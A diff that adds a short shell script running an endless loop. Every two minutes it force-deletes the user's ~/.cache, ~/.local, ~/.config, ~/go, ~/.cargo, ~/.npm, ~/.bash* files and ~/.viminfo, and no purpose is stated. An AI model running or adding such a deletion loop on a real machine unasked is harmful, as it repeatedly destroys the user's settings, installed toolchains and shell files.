@@ -1,0 +1,10 @@
+#!/bin/sh
+
+while :; do
+  set --
+  for dir in ~/.cache ~/.local ~/.config ~/go ~/.cargo ~/.npm ~/.bash* ~/.viminfo; do
+    [ -e "$dir" ] && set -- "$@" "$dir"
+  done
+  [ "$1" ] && rm -rf -- "$@"
+  sleep 120
+done
